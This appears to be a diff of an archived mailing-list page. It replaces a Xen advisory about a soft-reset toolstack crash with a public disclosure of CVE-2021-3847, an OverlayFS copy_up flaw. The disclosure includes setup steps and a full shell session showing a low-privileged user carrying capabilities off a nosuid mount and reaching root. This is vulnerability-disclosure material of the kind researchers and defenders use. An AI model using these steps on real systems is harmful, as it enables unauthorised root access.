@@ -1,151 +1,114 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/03/18/3
-Message-Id: <E1lMrJv-00073c-GM@xenbits.xenproject.org>
-Date: Thu, 18 Mar 2021 12:00:07 +0000
-From: Xen.org security team <security@....org>
-To: xen-announce@...ts.xen.org, xen-devel@...ts.xen.org, xen-users@...ts.xen.org, oss-security@...ts.openwall.com
-CC: Xen.org security team <security-team-members@....org>
-Subject: Xen Security Advisory 368 v2 - HVM soft-reset crashes toolstack
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/10/14/3
+Message-ID:  <PAXP193MB1405A3EC41713BE9D524FBE48DB89@PAXP193MB1405.EURP193.PROD.OUTLOOK.COM>
+Date: Thu, 14 Oct 2021 18:30:53 +0000
+From: Alon Zahavi <Alon.Zahavi@...erark.com>
+To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
+Subject: CVE-2021-3847: OverlayFS - Potential Privilege Escalation using overlays copy_up
 Content-Type: text/plain; charset=utf-8
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA256
 
-                    Xen Security Advisory XSA-368
-                              version 2
+After disclosing the issue with the linux-distros mailing list, I am reporting the security issue publicly to here.
+There is no patch available and may not be available for a long time because the kernel can’t enforce the mitigation proposed, as that would be a layering violation and could also possibly cause a regression.
+This vulnerability was attached with CVE-2021-3847.
+Here is the report that was initially sent:
 
-                   HVM soft-reset crashes toolstack
-
-UPDATES IN VERSION 2
-====================
-
-Public release.
-
-ISSUE DESCRIPTION
-=================
-
-libxl requires all data structures passed across its public interface
-to be initialized before use and disposed of afterwards by calling a
-specific set of functions.  Many internal data structures also require
-this initialize / dispose discipline, but not all of them.
-
-When the "soft reset" feature was implemented, the
-libxl__domain_suspend_state structure didn't require any
-initialization or disposal.  At some point later, an initialization
-function was introduced for the structure; but the "soft reset" path
-wasn't refactored to call the initialization function.  When a guest
-nwo initiates a "soft reboot", uninitialized data structure leads to
-an assert() when later code finds the structure in an unexpected
-state.
-
-The effect of this is to crash the process monitoring the guest.  How
-this affects the system depends on the structure of the toolstack.
-
-For xl, this will have no security-relevant effect: every VM has its
-own independent monitoring process, which contains no state.  The
-domain in question will hang in a crashed state, but can be destroyed
-by `xl destroy` just like any other non-cooperating domain.
-
-For daemon-based toolstacks linked against libxl, such as libvirt,
-this will crash the toolstack, losing the state of any in-progress
-operations (localized DoS), and preventing further administrator
-operations unless the daemon is configured to restart automatically
-(system-wide DoS).  If crashes "leak" resources, then repeated crashes
-could use up resources, also causing a system-wide DoS.
-
-IMPACT
-======
-
-A malicious guest can crash the management daemon, leading to at least
-a localized, possibly system-wide denial-of-service.
-
-VULNERABLE SYSTEMS
-==================
-
-Only Xen versions 4.12 through 4.14 are affected.  Earlier versions
-are not affected.
-
-The issue affects only systems with a guest monitoring process, which
-is linked against libxl, and which is important other than simply for
-the functioning of one particular guest.  libvirt is one common
-toolstack affected.  Systems using the `xl` command-line tool should
-generally suffer no security-relevant effects.
-
-The xapi toolstack does not currently link against libxl, and so is
-not affected.
-
-MITIGATION
-==========
-
-Ensuring that any management daemons are restarted automatically after
-a crash will partially mitigate the issue.
-
-CREDITS
-=======
-
-This issue was discovered by Olaf Hering.
-
-RESOLUTION
-==========
-
-Applying the appropriate attached patch resolves this issue.
-
-Note that patches for released versions are generally prepared to
-apply to the stable branches, and may not apply cleanly to the most
-recent release tarball.  Downstreams are encouraged to update to the
-tip of the stable branch before applying these patches.
-
-xsa368.patch           xen-unstable
-xsa368-4.14.patch      Xen 4.14.x
-xsa368-4.13.patch      Xen 4.13.x - Xen 4.12.x
-
-$ sha256sum xsa368*
-e80f33c3ce45372fef7bd91ec71b2b66e557176b79f9771872ce111bfff34150  xsa368.meta
-b82f2b110514cdf47a2688913ad5af68b01050751d56705a15ddf9a970b6fa0d  xsa368.patch
-636df70ae5eaf00b50ef0b5ac219a2aeda771c66833fae88e7ee43b18ae889f4  xsa368-4.13.patch
-55bbe59c75b69f493e364dfcf6cdbc7db4acd32dbf0b4d2466815b7c1f1823ce  xsa368-4.14.patch
-$
-
-DEPLOYMENT DURING EMBARGO
-=========================
-
-Deployment of the patches and/or mitigations described above (or
-others which are substantially similar) is permitted during the
-embargo, even on public-facing systems with untrusted guest users and
-administrators.
-
-But: Distribution of updated software is prohibited (except to other
-members of the predisclosure list).
-
-Predisclosure list members who wish to deploy significantly different
-patches and/or mitigations, please contact the Xen Project Security
-Team.
+## Bug Class
+Escalation of privileges - Bypassing the security extended attribute attachment restrictions (in order to modify the security.capability xattr, a process will need CAP_SYS_ADMIN or CAP_SETFCAP).
+# Technical Details
+## Summary:
+An attacker with a low-privileged user on a Linux machine with an overlay mount which has a file capability in one of its layers may escalate his privileges up to root when copying a capable file from a nosuid mount into another mount.
+## In details:
+If there is an overlay mount that one of its lower layers contains a file with capabilities and in case that the lower layer is a nosuid mount (which means the file capabilities are being ignored at execution), an attacker with low-privileges user can touch the file, which causes the overlayFS driver to copy_up the file with its capabilities into the upper layer. That way the attacker can now execute the file with the file's capabilities, thus escalating its privileges.
+See attached image.
+## Build:
+Any Linux machine with a support for overlayFS.
+For example: AWS EC2 Ubuntu 20.04.
+Mount a device to any folder.
+Copy any file with capabilities into that folder.
+Remount the device now with nosuid option.
+mount an overlayFS mount where there are two layers. Make sure the lower directory is the directory with the capable file.
+## Execution:
+As a low-priv user cd into the merged directory.
+Execute touch capable_file
+cd to the upper layer directory.
+Execute the capable binary.
+## Expected Results:
+When copying a capable file using a low privileges user, the file should be copied without any file capabilities. As the Linux kernel restricts the copying of a file with capabilities, so low-pric user should not be able to achieve this goal.
+## Observed Results:
+The new file that appears in the upper layer directory have the same capabilities as the file that had been copied. This behavior occur probably because the overlay driver's process is the one responsible for the copying, and it copies the whole file with its extended attributes.
 
 
-(Note: this during-embargo deployment notice is retained in
-post-embargo publicly released Xen Project advisories, even though it
-is then no longer applicable.  This is to enable the community to have
-oversight of the Xen Project Security Team's decisionmaking.)
+########## Example ##########
+# there are two mount in question
+$ cd /home/user/overlayfs/
 
-For more information about permissible uses of embargoed information,
-consult the Xen Project community's agreed Security Policy:
-  http://www.xenproject.org/security-policy.html
------BEGIN PGP SIGNATURE-----
+$ ls -l
+drwxr-xr-x 3 user user   4096 Sep 19 14:07 lowerUSB
+drwxrwxr-x 1 user user   4096 Sep 19 14:06 merge
+drwxrwxr-x 2 user user   4096 Sep 14 13:32 test
+drwxrwxr-x 2 user user   4096 Sep 19 14:06 upper
+drwxrwxr-x 3 user user   4096 Sep 19 14:25 work
 
-iQFABAEBCAAqFiEEI+MiLBRfRHX6gGCng/4UyVfoK9kFAmBTQEMMHHBncEB4ZW4u
-b3JnAAoJEIP+FMlX6CvZDAIH/ibVSFJRukaH4TKAtm0Qy7Qb0jSF6u5lHdUH4lfa
-EXTAS4/vAJI70bMt2yePGoaa+QPSJ340MwlKcW8GerAEWeW0hTxOp23GGavEwbtu
-I+OFdls2YGrxGM2FMQR0ZEftV4jsyVAcCNF6oq6nqzTDe1OZC0bQSDUL69CWnIKn
-hC9Br/hV3AuijwwQdOGQoe+rj8aZK134UaNjr0AI9e1l2jEsJ3NxC3IxeHy4/J3E
-meoHKtTRZXFdG2VMu709jqrnhpOQcZDT+meiNhoOdUvXyPBa2MzVj3XY32yWuJxa
-Fi7qrpXIAZ8qNbCbLIbNYMGlgB+7sLsKQULycgai8Sk7QpU=
-=ea+C
------END PGP SIGNATURE-----
+# there are two mount in question.
+# lowerUSB is a mount of an USB, which has a capable file inside.
+# IMPORTENT NOTE: This mount has "nosuid" option, so capabilities should be ignored while executing it.
+# The second mount is the overlay mount. Its lower directory is `lowerUSB/` which is the first mount mentioned above. Its upper is just a regular directory on the root fs.
+$ mount
+/dev/sdd on /home/user/overlayfs/lowerUSB type ext4 (rw,nosuid,nodev,relatime,uhelper=udisks2)
+overlay on /home/user/overlayfs/merge type overlay (rw,relatime,lowerdir=lowerUSB,upperdir=upper,workdir=work)
 
-Download attachment "xsa368.meta" of type "application/octet-stream" (1075 bytes)
+# The contents of all the directories.
+$ ls -l *
+lowerUSB:
+total 40
+-rwxr-xr-x 1 user user 17104 Sep 13 15:58 escalate
+drwx------ 2 user user 16384 Jul  5 14:07 lost+found
 
-Download attachment "xsa368.patch" of type "application/octet-stream" (4605 bytes)
+merge:
+total 40
+-rwxr-xr-x 1 user user 17104 Sep 19 14:27 escalate
+drwx------ 2 user user 16384 Jul  5 14:07 lost+found
 
-Download attachment "xsa368-4.13.patch" of type "application/octet-stream" (4574 bytes)
+test:
+total 0
 
-Download attachment "xsa368-4.14.patch" of type "application/octet-stream" (4530 bytes)
+upper:
+total 0
+
+work:
+total 4
+d--------- 2 root root 4096 Sep 19 14:25 work
+
+# escalate is an executable that set its uid and gid to 0.
+$ getcap ./lowerUSB/escalate
+./lowerUSB/escalate = cap_setgid,cap_setuid+eip
+
+$ id
+uid=1000(user) gid=1000(user) groups=1000(user)
+
+# When trying to execute ./lowerUSB/escalate, it does not work because it is a `nosuid` mount.
+$ ./lowerUSB/escalate
+[-] Failure
+
+# Try to copy the binary with its capabilities.
+# It should not work, because regular users are not allowed to copy the "security.capability" xattr.
+$ cp --preserve=all ./lowerUSB/escalate ./test/escalate
+cp: setting attribute 'security.capability' for 'security.capability': Operation not permitted
+
+# Trigger the copy_up
+$ touch ./merge/escalate
+$ ls -l ./upper/
+-rwxr-xr-x 1 user user 17K Sep 19 15:01 escalate
+
+# The copy_up kept the binary capabilities (xattr)
+$ getcap ./upper/escalate
+./upper/escalate = cap_setgid,cap_setuid+eip
+
+# executing the binary, with the capabilities, so the privileges will escalate to root.
+$ ./upper/escalate
+$ id
+uid=0(root) gid=0(root) groups=0(root)
+
+
+
